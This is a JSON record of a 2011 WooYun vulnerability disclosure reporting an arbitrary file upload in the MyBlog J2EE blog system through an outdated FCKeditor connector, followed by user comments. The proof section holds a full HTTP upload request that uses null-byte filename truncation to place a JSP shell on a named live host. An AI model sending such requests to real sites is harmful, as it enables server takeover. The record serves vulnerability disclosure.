{"id": 22971, "wybug_id": "wooyun-2011-02012", "wybug_title": "MyBlog存在任意文件上传漏洞", "wybug_corp": "MyBlog", "wybug_author": "BNE", "wybug_date": "2011-04-29 18:08", "wybug_open_date": "2011-04-29 18:17", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-04-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： MyBlog是一个J2ee的开源自建blog系统，攻击者通过他的一些组件问题，可以上传任意文件。 详细说明：  由于使用了早期版本的fckeditor。导致可以通过文件名截断，绕过后缀名验证，上传任意文件。   漏洞证明：  提交如下http包，即可上传shellhttp://jdkcn.com/upload/Image/b.jsp\nPOST /FCK/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F HTTP/1.1Accept: */*Accept-Language: en-US,zh-cn;q=0.5User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Content-Type: multipart/form-data; boundary=---------------------------7d9cb26524eeHost: jdkcn.comContent-Length: xxxxxxCache-Control: no-cache-----------------------------7d9cb26524eeContent-Disposition: form-data; name=\"NewFile\"; filename=\"b.jsp(此处为null字符).jpg\"Content-Type: text/plain<%@ page contentType=\"text/html; charset=GBK\" %><%@ page import=\"java.io.*\"%><%@ page import=\"java.nio.charset.Charset\"%><%@ page import=\"java.util.regex.*\"%>..........................-----------------------------7d9cb26524ee--\n   修复方案：  修复fckeditor组件吧。   版权声明：转载请注明来源 BNE@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-04-30 00:19 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  看来楼主是关注了前几天百度营销平台被黑的事情...    \n     2011-05-08 22:07 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  我说是这里有漏洞嘛 xiaoyu还和我打马虎眼    \n     2011-05-09 14:53 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  顶黑客黑百度    \n     2011-05-10 22:32 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  黑百度黑的爽啊！给力！要是能黑谷歌就好了    \n     2011-05-20 14:03 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  嘿嘿 好玩咯    \n     2011-10-19 18:52 |    \t\tw0lfram \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 流氓无罪，文化可耻。)\t\t \n  ...    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}